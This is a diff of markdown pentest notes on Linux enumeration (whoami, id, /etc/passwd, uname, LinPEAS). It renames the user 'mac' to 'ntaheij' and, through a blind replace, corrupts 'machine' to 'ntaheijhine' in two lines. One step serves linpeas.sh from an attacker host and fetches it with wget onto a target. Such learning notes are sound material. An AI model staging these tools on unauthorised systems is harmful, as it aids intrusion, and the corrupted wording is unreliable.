@@ -3,17 +3,17 @@
 ## Check who you are
 
 ```bash
-┌──(mac㉿kali)-[~]
+┌──(ntaheij㉿kali)-[~]
 └─$ whoami
-mac
+ntaheij
 ```
 
 or alternatively use `id` to see more information about your `uid` and which groups you are in:
 
 ```bash
-┌──(mac㉿kali)-[~]
+┌──(ntaheij㉿kali)-[~]
 └─$ id
-uid=1000(mac) gid=1000(mac) groups=1000(mac),27(sudo)
+uid=1000(ntaheij) gid=1000(ntaheij) groups=1000(ntaheij),27(sudo)
 ```
 
 ## Check for other people
@@ -28,13 +28,13 @@ Many of these users will relate to certain services, and not be a real person. L
 ```bash
 $ cat /etc/passwd | grep sh
 root:x:0:0:root:/root:/bin/bash
-mac:x:1000:1000:Mac,,,:/home/mac:/bin/bash
+ntaheij:x:1000:1000:ntaheij,,,:/home/ntaheij:/bin/bash
 ```
 
 ## Check kernel information
 
 ```bash
-┌──(mac㉿kali)-[~]
+┌──(ntaheij㉿kali)-[~]
 └─$ uname -a
 Linux kali 5.10.0-kali5-amd64 #1 SMP Debian 5.10.24-1kali1 (2021-03-23) x86_64 GNU/Linux
 ```
@@ -130,7 +130,7 @@ Install Linpeas from [GitHub](https://github.com/carlospolop/privilege-escalatio
 
 Placing `linpeas.sh` in `~/Documents/enum` allows you to easily retrieve it with a simple python server. See [[Aliases#Useful Aliases|Useful Aliases]] for `enumserve` alias setup instructions.
 
-On attacker machine:
+On attacker ntaheijhine:
 
 ```bash
 $ enumserve
@@ -138,7 +138,7 @@ $ enumserve
 
 Find your IP address ([[Linux Networking#Get your IP]])
 
-On target machine:
+On target ntaheijhine:
 
 ```bash
 $ wget [IP]:8000/linpeas.sh
